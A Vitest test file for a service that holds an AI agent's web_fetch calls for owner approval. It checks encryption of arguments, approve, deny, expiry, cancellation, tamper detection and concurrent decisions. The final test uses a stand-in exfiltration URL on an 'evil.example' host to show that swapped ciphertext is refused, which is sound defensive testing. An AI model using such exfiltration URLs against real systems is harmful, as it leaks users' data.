import { randomBytes } from 'node:crypto'
import { PGlite } from '@electric-sql/pglite'
import { vector } from '@electric-sql/pglite-pgvector'
import { Approval, type RunId } from '@mawl/contracts'
import { migrationsFolder, schema } from '@mawl/db'
import { fakeModel } from '@mawl/testkit'
import { and, asc, eq, sql } from 'drizzle-orm'
import { drizzle } from 'drizzle-orm/pglite'
import { migrate } from 'drizzle-orm/pglite/migrator'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { createLogger } from '../logger.ts'
import { RunRegistry } from '../runs/registry.ts'
import { createRunService } from '../runs/service.ts'
import { createRunStore } from '../runs/store.ts'
import { seedMessage, seedProfile, seedRun, seedThread } from '../runs/test-util.ts'
import { createRunTask } from '../runs/worker.ts'
import { createSecretBox, type SecretBox } from '../secrets/index.ts'
import { createServerTools } from '../tools/registry.ts'
import { ApprovalConflictError, ApprovalInvariantError, createApprovalService } from './service.ts'

const { runs, events, approvals, runWaits } = schema

describe('approvals end to end (PGlite)', () => {
  const client = new PGlite({ extensions: { vector } })
  const db = drizzle(client, { schema })
  const logger = createLogger({ level: 'silent' })
  let box: SecretBox

  beforeAll(async () => {
    await migrate(db, { migrationsFolder })
    box = await createSecretBox(new Uint8Array(randomBytes(32)))
  }, 120_000)
  afterAll(() => client.close())

  const noSearch = {
    provider: async () => ({
      name: 'unused',
      search: () => Promise.reject(new Error('search is not used here')),
    }),
  }

  async function seedQueued(trigger: 'user' | 'teammate' = 'user'): Promise<RunId> {
    const profileId = await seedProfile(db)
    const threadId = await seedThread(db, profileId)
    const runId = await seedRun(db, profileId, { threadId, trigger })
    await seedMessage(db, threadId, 'user', [{ type: 'text', text: 'go' }], undefined, runId)
    return runId
  }

  function harness(secretBox: SecretBox = box) {
    const webFetch = vi.fn(
      async (url: string) =>
        new Response(`<p>page ${url}</p>`, { headers: { 'content-type': 'text/html' } }),
    )
    const run = createRunTask({
      db,
      registry: new RunRegistry(),
      logger,
      secretBox,
      resolveModel: async () => ({ model: models.shift() ?? fakeModel([{ text: 'spare' }]) }),
      requeue: async () => {},
      tools: createServerTools({ db, search: noSearch, webFetch }),
    })
    const models: ReturnType<typeof fakeModel>[] = []
    const enqueued: RunId[] = []
    const service = createApprovalService({
      db,
      logger,
      enqueue: async (id) => void enqueued.push(id),
    })
    const runService = createRunService({
      db,
      registry: new RunRegistry(),
      logger,
      enqueue: async (id) => void enqueued.push(id),
    })
    return {
      webFetch,
      service,
      runService,
      enqueued,
      execute: (runId: RunId, model: ReturnType<typeof fakeModel>) => {
        models.push(model)
        return run({ runId }, { abortSignal: new AbortController().signal })
      },
    }
  }

  const fetchCall = (url: string) => ({ toolCalls: [{ name: 'web_fetch', input: { url } }] })
  const statusOf = async (id: RunId) =>
    (await db.select().from(runs).where(eq(runs.id, id)))[0]?.status
  const approvalOf = async (runId: RunId) =>
    (await db.select().from(approvals).where(eq(approvals.runId, runId)))[0]
  const eventsOf = async (runId: RunId, type: string) =>
    db
      .select()
      .from(events)
      .where(and(eq(events.runId, runId), eq(events.type, type)))
      .orderBy(asc(events.id))
  const toolResult = (runId: RunId, toolCallId = 'call_1') =>
    createRunStore(db).toolResult(runId, { stepIdx: 0, toolCallId })

  it('parks a first fetch in waiting_approval with the arguments encrypted, and announces it', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://a.example/p?secret=s3cr3t')]))
    expect(await statusOf(runId)).toBe('waiting_approval')
    expect(h.webFetch).not.toHaveBeenCalled()

    const row = await approvalOf(runId)
    expect(row).toMatchObject({ status: 'pending', tool: 'web_fetch', stepIdx: 0 })
    // Ciphertext only: the full url (with its query) is nowhere in the row but the encrypted blob.
    expect(Buffer.from(row?.argsEnc ?? []).toString('latin1')).not.toContain('s3cr3t')
    expect(JSON.stringify(row?.argsRedacted)).not.toContain('s3cr3t')
    expect(box.decrypt(row?.argsEnc ?? new Uint8Array(), `approvals:${row?.id}`)).toBe(
      '{"url":"https://a.example/p?secret=s3cr3t"}',
    )
    const expiresIn = (row?.expiresAt.getTime() ?? 0) - (row?.createdAt.getTime() ?? 0)
    expect(expiresIn).toBe(24 * 60 * 60 * 1000)

    const [created] = await eventsOf(runId, 'approval.created')
    if (!created) throw new Error('no approval.created event')
    const parsed = Approval.parse((created.payload as { approval: unknown }).approval)
    expect(parsed).toMatchObject({ id: row?.id, status: 'pending', runId })
    expect(JSON.stringify(created?.payload)).not.toContain('s3cr3t')
    const [wait] = await db.select().from(runWaits).where(eq(runWaits.runId, runId))
    expect(wait).toMatchObject({ kind: 'approval', resolvedAt: null })
    expect(JSON.stringify(wait?.payload)).not.toContain('s3cr3t')
  })

  it('approve replays the stored call once, and its host counts as seen for later fetches', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://a.example/one')]))
    const id = (await approvalOf(runId))?.id
    if (!id) throw new Error('no approval')

    const decided = await h.service.decide(id, 'approve', { deviceId: null, via: 'app' })
    expect(decided).toMatchObject({ status: 'approved', decidedViaChannel: 'app' })
    expect(decided.decidedAt).not.toBeNull()
    expect(await statusOf(runId)).toBe('running')
    expect(h.enqueued).toEqual([runId])

    await h.execute(
      runId,
      fakeModel([
        { toolCalls: [{ name: 'web_fetch', input: { url: 'https://a.example/two' } }] },
        { text: 'read both' },
      ]),
    )
    expect(await statusOf(runId)).toBe('succeeded')
    expect(h.webFetch.mock.calls.map((c) => c[0])).toEqual([
      'https://a.example/one',
      'https://a.example/two',
    ])
    // Exactly one approval: the second fetch to the same host did not ask again.
    expect(await db.select().from(approvals).where(eq(approvals.runId, runId))).toHaveLength(1)
    const calls = (await eventsOf(runId, 'run.tool_call')).map((e) => e.payload)
    expect(calls).toEqual([
      expect.objectContaining({ level: 'ask' }),
      expect.objectContaining({ level: 'ask', approved: true }),
      expect.objectContaining({ level: 'auto' }),
    ])
    const resolved = await eventsOf(runId, 'approval.resolved')
    expect(resolved.map((e) => e.payload)).toEqual([
      { approvalId: id, status: 'approved', via: 'app' },
    ])
    // A second decision is a conflict that carries the status.
    await expect(h.service.decide(id, 'deny', { deviceId: null, via: 'app' })).rejects.toEqual(
      new ApprovalConflictError('approved'),
    )
  })

  it('deny returns a denial to the model and the run continues', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://b.example/')]))
    const id = (await approvalOf(runId))?.id as NonNullable<
      Awaited<ReturnType<typeof approvalOf>>
    >['id']
    await h.service.decide(id, 'deny', { deviceId: null, via: 'app' })
    expect((await toolResult(runId))?.preview).toMatch(/owner denied/)
    await h.execute(runId, fakeModel([{ text: 'ok, skipping it' }]))
    expect(await statusOf(runId)).toBe('succeeded')
    expect(h.webFetch).not.toHaveBeenCalled()
  })

  it('expires a pending approval as a denial, resumes the run, and refuses a late approve', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://c.example/')]))
    const row = await approvalOf(runId)
    if (!row) throw new Error('no approval')
    expect(await h.service.expireDue()).toBe(0)

    await db
      .update(approvals)
      .set({ expiresAt: sql`now() - interval '1 second'` })
      .where(eq(approvals.id, row.id))
    expect(await h.service.expireDue()).toBe(1)
    expect(await h.service.expireDue()).toBe(0)
    expect((await approvalOf(runId))?.status).toBe('expired')
    expect(await statusOf(runId)).toBe('running')
    expect(h.enqueued).toEqual([runId])
    expect((await toolResult(runId))?.preview).toMatch(/expired/)
    await expect(
      h.service.decide(row.id, 'approve', { deviceId: null, via: 'app' }),
    ).rejects.toEqual(new ApprovalConflictError('expired'))
    await h.execute(runId, fakeModel([{ text: 'moving on' }]))
    expect(await statusOf(runId)).toBe('succeeded')
    expect(h.webFetch).not.toHaveBeenCalled()
  })

  it('an approve that arrives after the expiry is resolved as expired, never run', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://d.example/')]))
    const row = await approvalOf(runId)
    if (!row) throw new Error('no approval')
    await db
      .update(approvals)
      .set({ expiresAt: sql`now() - interval '1 second'` })
      .where(eq(approvals.id, row.id))
    await expect(
      h.service.decide(row.id, 'approve', { deviceId: null, via: 'app' }),
    ).rejects.toEqual(new ApprovalConflictError('expired'))
    expect((await approvalOf(runId))?.status).toBe('expired')
    expect(await statusOf(runId)).toBe('running')
    expect(h.enqueued).toEqual([runId])
  })

  it('cancel from waiting_approval ends the run and resolves the approval as cancelled', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://e.example/')]))
    const row = await approvalOf(runId)
    if (!row) throw new Error('no approval')
    await h.runService.cancel(runId)
    expect(await statusOf(runId)).toBe('cancelled')
    const after = await approvalOf(runId)
    expect(after?.status).toBe('cancelled')
    expect(after?.decidedAt).not.toBeNull()
    expect((await eventsOf(runId, 'approval.resolved')).map((e) => e.payload)).toEqual([
      { approvalId: row.id, status: 'cancelled' },
    ])
    const [wait] = await db.select().from(runWaits).where(eq(runWaits.runId, runId))
    expect(wait?.resolvedAt).not.toBeNull()
    await expect(
      h.service.decide(row.id, 'approve', { deviceId: null, via: 'app' }),
    ).rejects.toEqual(new ApprovalConflictError('cancelled'))
    expect(h.enqueued).toEqual([])
  })

  it('fails closed when the stored hash was tampered with: the call is denied, never fetched', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://f.example/')]))
    const row = await approvalOf(runId)
    if (!row) throw new Error('no approval')
    await db
      .update(approvals)
      .set({ argsHash: '0'.repeat(64) })
      .where(eq(approvals.id, row.id))
    await h.service.decide(row.id, 'approve', { deviceId: null, via: 'app' })
    await h.execute(runId, fakeModel([{ text: 'no page' }]))
    expect(h.webFetch).not.toHaveBeenCalled()
    expect((await toolResult(runId))?.preview).toMatch(/does not match/)
    expect(await statusOf(runId)).toBe('succeeded')
  })

  it('fails closed when the arguments cannot be decrypted (the master key changed)', async () => {
    const h = harness()
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall('https://g.example/')]))
    const row = await approvalOf(runId)
    if (!row) throw new Error('no approval')
    await h.service.decide(row.id, 'approve', { deviceId: null, via: 'app' })
    const other = harness(await createSecretBox(new Uint8Array(randomBytes(32))))
    await other.execute(runId, fakeModel([{ text: 'no page' }]))
    expect(other.webFetch).not.toHaveBeenCalled()
    expect((await toolResult(runId))?.preview).toMatch(/does not match/)
  })

  it('a teammate-triggered run never inherits another run approval for the same call key', async () => {
    const h = harness()
    const owner = await seedQueued()
    await h.execute(owner, fakeModel([fetchCall('https://h.example/')]))
    const row = await approvalOf(owner)
    if (!row) throw new Error('no approval')
    await h.service.decide(row.id, 'approve', { deviceId: null, via: 'app' })

    const teammate = await seedQueued('teammate')
    await h.execute(teammate, fakeModel([fetchCall('https://h.example/')]))
    expect(await statusOf(teammate)).toBe('waiting_approval')
    expect(h.webFetch).not.toHaveBeenCalled()
  })

  it('lists pending approvals newest first, filters by profile, and gets one by id', async () => {
    const h = harness()
    const a = await seedQueued()
    await h.execute(a, fakeModel([fetchCall('https://i.example/')]))
    const b = await seedQueued()
    await h.execute(b, fakeModel([fetchCall('https://j.example/')]))
    const pending = await h.service.list({ status: 'pending' })
    const ids = pending.map((p) => p.runId)
    expect(ids.indexOf(b)).toBeLessThan(ids.indexOf(a))
    for (const p of pending) expect(Approval.safeParse(p).success).toBe(true)
    const profileId = (await db.select().from(runs).where(eq(runs.id, a)))[0]?.profileId
    const mine = await h.service.list({ ...(profileId ? { profileId } : {}) })
    expect(mine.map((p) => p.runId)).toEqual([a])
    expect(await h.service.list({ status: 'pending', limit: 1 })).toHaveLength(1)
    const one = await h.service.get(mine[0]?.id as Approval['id'])
    expect(one).toEqual(mine[0])
  })

  /** A parked run with a pending approval; returns the run and the approval id. */
  async function parked(h: ReturnType<typeof harness>, url: string) {
    const runId = await seedQueued()
    await h.execute(runId, fakeModel([fetchCall(url)]))
    const row = await approvalOf(runId)
    if (!row) throw new Error('no approval')
    return { runId, id: row.id }
  }
  const by = { deviceId: null, via: 'app' } as const
  const makeDue = (id: Approval['id'], secondsAgo = 1) =>
    db
      .update(approvals)
      .set({ expiresAt: sql`now() - make_interval(secs => ${secondsAgo})` })
      .where(eq(approvals.id, id))

  it('refuses a pending approval whose run is not waiting as a broken invariant, not a 409', async () => {
    const h = harness()
    const { runId, id } = await parked(h, 'https://k.example/')
    await db.update(runs).set({ status: 'running' }).where(eq(runs.id, runId))
    await expect(h.service.decide(id, 'approve', by)).rejects.toBeInstanceOf(ApprovalInvariantError)
    expect((await approvalOf(runId))?.status).toBe('pending')
    expect(h.enqueued).toEqual([])
    // Leave nothing pending and due behind for the sweeps below.
    await db
      .update(approvals)
      .set({ status: 'cancelled', decidedAt: sql`now()` })
      .where(eq(approvals.id, id))
  })

  it('keeps sweeping when one due approval fails, logs its id and the error name only', async () => {
    const h = harness()
    const broken = await parked(h, 'https://l.example/')
    const fine = await parked(h, 'https://m.example/')
    // The broken one is due first, so the sweep meets it before the fine one.
    await makeDue(broken.id, 60)
    await makeDue(fine.id, 1)
    await db.update(runs).set({ status: 'running' }).where(eq(runs.id, broken.runId))
    const error = vi.spyOn(logger, 'error')
    try {
      expect(await h.service.expireDue()).toBe(1)
      expect((await approvalOf(fine.runId))?.status).toBe('expired')
      expect(h.enqueued).toEqual([fine.runId])
      expect(error).toHaveBeenCalledWith(
        { approvalId: broken.id, errName: 'ApprovalInvariantError' },
        expect.any(String),
      )
    } finally {
      error.mockRestore()
      await db
        .update(approvals)
        .set({ status: 'cancelled', decidedAt: sql`now()` })
        .where(eq(approvals.id, broken.id))
    }
  })

  /**
   * PGlite has one connection and runs transactions one at a time, so `Promise.all` cannot
   * interleave two transactions here: these check that concurrent calls serialize cleanly in
   * either order (one wins, the other is a conflict, one `approval.resolved`, one resume). The
   * row locks that make this hold on Postgres are exercised only by the Docker suites.
   */
  describe('concurrent decisions resolve once', () => {
    /** Starts `a` and `b` together, `a` first or second, and returns their outcomes as `[a, b]`. */
    async function settleBoth<A, B>(
      aFirst: boolean,
      a: () => Promise<A>,
      b: () => Promise<B>,
    ): Promise<[PromiseSettledResult<A>, PromiseSettledResult<B>]> {
      if (aFirst) return Promise.allSettled([a(), b()])
      const [rb, ra] = await Promise.allSettled([b(), a()])
      return [ra, rb]
    }
    const resolvedEvents = async (runId: RunId) =>
      (await eventsOf(runId, 'approval.resolved')).length
    const runningEvents = async (runId: RunId) =>
      (await eventsOf(runId, 'run.status')).filter(
        (e) =>
          (e.payload as { status?: string }).status === 'running' &&
          (e.payload as { prevStatus?: string }).prevStatus === 'waiting_approval',
      ).length

    it.each([
      ['approve then deny', 'approve', 'deny'],
      ['deny then approve', 'deny', 'approve'],
    ] as const)('decide vs decide (%s)', async (_label, first, second) => {
      const h = harness()
      const { runId, id } = await parked(h, `https://n-${first}.example/`)
      const results = await Promise.allSettled([
        h.service.decide(id, first, by),
        h.service.decide(id, second, by),
      ])
      expect(results.map((r) => r.status)).toEqual(['fulfilled', 'rejected'])
      const won = first === 'approve' ? 'approved' : 'denied'
      expect((results[1] as PromiseRejectedResult).reason).toEqual(new ApprovalConflictError(won))
      expect((await approvalOf(runId))?.status).toBe(won)
      expect(await resolvedEvents(runId)).toBe(1)
      expect(await runningEvents(runId)).toBe(1)
      expect(h.enqueued).toEqual([runId])
    })

    it.each([
      ['decide first', true],
      ['sweep first', false],
    ] as const)('decide vs expireDue (%s)', async (_label, decideFirst) => {
      const h = harness()
      const { runId, id } = await parked(h, `https://o-${decideFirst}.example/`)
      await makeDue(id)
      const [d, s] = await settleBoth(
        decideFirst,
        () => h.service.decide(id, 'approve', by),
        () => h.service.expireDue(),
      )
      // Whoever gets the locks first, the approval ran out: it resolves expired exactly once, never
      // approved. The sweep counts it only when it resolved it itself.
      expect(d.status).toBe('rejected')
      expect((d as PromiseRejectedResult).reason).toEqual(new ApprovalConflictError('expired'))
      expect(s.status).toBe('fulfilled')
      expect([0, 1]).toContain((s as PromiseFulfilledResult<number>).value)
      expect((await approvalOf(runId))?.status).toBe('expired')
      expect(await resolvedEvents(runId)).toBe(1)
      expect(await runningEvents(runId)).toBe(1)
      expect(h.enqueued).toEqual([runId])
    })

    it.each([
      ['decide first', true],
      ['cancel first', false],
    ] as const)('decide vs cancel (%s)', async (_label, decideFirst) => {
      const h = harness()
      const { runId, id } = await parked(h, `https://p-${decideFirst}.example/`)
      const [d, c] = await settleBoth(
        decideFirst,
        () => h.service.decide(id, 'approve', by),
        () => h.runService.cancel(runId),
      )
      expect(c.status).toBe('fulfilled')
      expect(await statusOf(runId)).toBe('cancelled')
      expect(await resolvedEvents(runId)).toBe(1)
      // The call order does not fix which transaction takes the run lock first.
      if ((await approvalOf(runId))?.status === 'approved') {
        // Approved, then the running run was cancelled before it resumed: nothing ran.
        expect(d.status).toBe('fulfilled')
        expect((await approvalOf(runId))?.status).toBe('approved')
        expect(h.enqueued).toEqual([runId])
      } else {
        expect((d as PromiseRejectedResult).reason).toEqual(new ApprovalConflictError('cancelled'))
        expect((await approvalOf(runId))?.status).toBe('cancelled')
        expect(h.enqueued).toEqual([])
      }
      // A job that picks the run up now does nothing.
      await h.execute(runId, fakeModel([{ text: 'never' }]))
      expect(h.webFetch).not.toHaveBeenCalled()
    })
  })

  it('binds the encrypted arguments to their own approval: a blob moved to another row is refused', async () => {
    const h = harness()
    const victim = await parked(h, 'https://q.example/harmless')
    const donor = await parked(h, 'https://evil.example/collect?d=secret')
    const [donorRow] = await db.select().from(approvals).where(eq(approvals.id, donor.id))
    if (!donorRow) throw new Error('no donor row')
    // Copy the donor's ciphertext and hash onto the victim, as a database-level attacker might.
    await db
      .update(approvals)
      .set({ argsEnc: donorRow.argsEnc, argsHash: donorRow.argsHash })
      .where(eq(approvals.id, victim.id))
    expect(() => box.decrypt(donorRow.argsEnc, `approvals:${victim.id}`)).toThrow()
    await h.service.decide(victim.id, 'approve', by)
    await h.execute(victim.runId, fakeModel([{ text: 'no page' }]))
    expect(h.webFetch).not.toHaveBeenCalled()
    expect((await toolResult(victim.runId))?.preview).toMatch(/does not match/)
  })
})
